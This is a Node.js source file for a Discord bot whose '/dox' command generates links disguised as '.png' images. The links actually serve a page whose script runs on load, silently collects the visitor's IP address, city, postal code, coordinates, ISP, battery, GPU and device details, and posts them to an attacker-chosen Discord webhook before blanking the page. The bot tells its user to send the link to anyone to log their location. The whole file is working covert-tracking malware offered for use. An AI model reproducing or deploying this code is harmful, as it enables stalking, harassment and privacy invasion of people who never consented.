const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

// ---- ENVIRONMENT VARIABLES ----
const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const PORT = process.env.PORT || 3000;

// ---- MINIMAL INTENTS ----
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ],
});

// ---- STORE ACTIVE LINKS ----
const links = new Map();

// ---- EXPRESS SERVER ----
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    console.log(`🔍 Requested ID: ${id}`);
    console.log(`📦 Current links:`, Array.from(links.keys()));
    
    if (!links.has(id)) {
        console.log(`❌ ID not found: ${id}`);
        res.type('image/png');
        return res.send('Image not found');
    }
    
    console.log(`✅ ID found: ${id}`);
    const linkData = links.get(id);
    const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
    res.type('text/html');
    res.send(generateDoxHTML(targetWebhook));
});

app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
});

// ---- DISCORD BOT ----
client.once('ready', async () => {
    console.log(`🤖 Logged in as ${client.user.tag}`);
    
    try {
        await client.application.commands.set([]);
        console.log('✅ Cleared all global commands');
        
        await client.application.commands.set([
            { 
                name: 'dox', 
                description: 'Generate a fresh dox link',
                options: [
                    {
                        name: 'webhook',
                        description: 'Discord webhook URL to send data to',
                        type: 3,
                        required: true
                    }
                ]
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('❌ Failed to register commands:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX (FIXED — replies instantly) ----
    if (interaction.commandName === 'dox') {
        // IMMEDIATELY acknowledge the command
        await interaction.deferReply({ ephemeral: true });

        // Now do the work
        const customWebhook = interaction.options.getString('webhook');
        if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
        }
        
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;

        links.set(id, {
            created: Date.now(),
            user: interaction.user.tag,
            webhook: customWebhook
        });

        console.log(`✅ Generated link: ${url}`);
        console.log(`📦 Webhook: ${customWebhook}`);

        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
            .setFooter({ text: 'Expires after 100 links generated' });

        // Now edit the reply with the actual content
        await interaction.editReply({ embeds: [embed] });
    }
});

// ---- CLEANUP ----
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) {
        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
    }
}, 60000);

// ---- DOX HTML ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
    const WEBHOOK_URL = "${webhook}";

    // ---- IP DATA (with fallback) ----
    async function getIPData() {
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                    asn: data.asn || 'N/A',
                    isp: data.org || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            }
        } catch (e) {
            console.log('ipinfo.io failed, trying fallback...');
        }
        // Fallback to ip-api.com
        try {
            const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    ip: data.query || 'N/A',
                    country: data.country || 'N/A',
                    region: data.regionName || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.zip || 'N/A',
                    lat: data.lat || 'N/A',
                    lon: data.lon || 'N/A',
                    asn: data.as || 'N/A',
                    isp: data.isp || 'N/A',
                    timezone: 'N/A'
                };
            }
        } catch (e) {}
        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
    }

    // ---- BATTERY ----
    async function getBattery() {
        try {
            const b = await navigator.getBattery();
            return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Charging' : 'Not Charging' };
        } catch { return { level: 'Not Available', charging: 'N/A' }; }
    }

    // ---- CONNECTION ----
    function getConnection() {
        try {
            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (c) {
                return { 
                    type: c.effectiveType || c.type || 'unknown', 
                    downlink: c.downlink || 'N/A' 
                };
            }
        } catch {}
        return { type: 'Not Available', downlink: 'N/A' };
    }

    // ---- GPU ----
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'Not Available';
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debug) return 'Not Available';
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch { return 'Not Available'; }
    }

    // ---- MAIN ----
    (async function() {
        try {
            const ipData = await getIPData();
            const battery = await getBattery();
            const conn = getConnection();
            const gpu = getGPU();

            const ua = navigator.userAgent;
            const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
            const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
            const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? '📱 Mobile' : /tablet|ipad/i.test(ua) ? '📱 Tablet' : '💻 Desktop';

            const data = {
                timestamp: new Date().toISOString(),
                ip: ipData.ip || 'N/A',
                country: ipData.country || 'N/A',
                region: ipData.region || 'N/A',
                city: ipData.city || 'N/A',
                postal: ipData.postal || 'N/A',
                lat: ipData.lat || 'N/A',
                lon: ipData.lon || 'N/A',
                asn: ipData.asn || 'N/A',
                isp: ipData.isp || 'N/A',
                timezone: ipData.timezone || 'N/A',
                battery: battery.level + ' (' + battery.charging + ')',
                connection: conn.type + ' (' + conn.downlink + ' Mbps)',
                browser: browser,
                os: os,
                deviceType: deviceType,
                screen: screen.width + 'x' + screen.height,
                gpu: gpu,
                userAgent: ua,
            };

            const mapUrl = \`https://www.google.com/maps?q=\${data.lat},\${data.lon}\`;

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "☠️ Doxxed",
                        color: 0xFF0000,
                        fields: [
                            { name: "🌐 IP", value: data.ip || 'N/A', inline: true },
                            { name: "📍 Country", value: data.country || 'N/A', inline: true },
                            { name: "🏙️ City", value: data.city || 'N/A', inline: true },
                            { name: "🗺️ Region", value: data.region || 'N/A', inline: true },
                            { name: "📮 Postal", value: data.postal || 'N/A', inline: true },
                            { name: "📌 Coordinates", value: \`\${data.lat}, \${data.lon}\` || 'N/A', inline: true },
                            { name: "🔢 ASN", value: data.asn || 'N/A', inline: true },
                            { name: "🏢 ISP", value: data.isp || 'N/A', inline: true },
                            { name: "🕒 Timezone", value: data.timezone || 'N/A', inline: true },
                            { name: "🔋 Battery", value: data.battery || 'N/A', inline: true },
                            { name: "📶 Connection", value: data.connection || 'N/A', inline: true },
                            { name: "📱 Screen", value: data.screen || 'N/A', inline: true },
                            { name: "🧠 Browser", value: data.browser || 'N/A', inline: true },
                            { name: "💻 OS", value: data.os || 'N/A', inline: true },
                            { name: "🖥️ Device", value: data.deviceType || 'N/A', inline: true },
                            { name: "🎮 GPU", value: data.gpu || 'N/A', inline: false },
                            { name: "🗺️ Map", value: \`[Click to view](\${mapUrl})\`, inline: false },
                        ],
                        footer: { text: "Logged at " + data.timestamp }
                    }]
                })
            });

        } catch (err) {
            console.error('Dox error:', err);
        }

        // ---- CLOSE ----
        document.body.innerHTML = '';
        document.body.style.background = '#ffffff';
        document.body.style.margin = '0';
        document.body.style.height = '100vh';
        setTimeout(() => {
            window.close();
            window.location.href = 'about:blank';
        }, 1500);
    })();
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
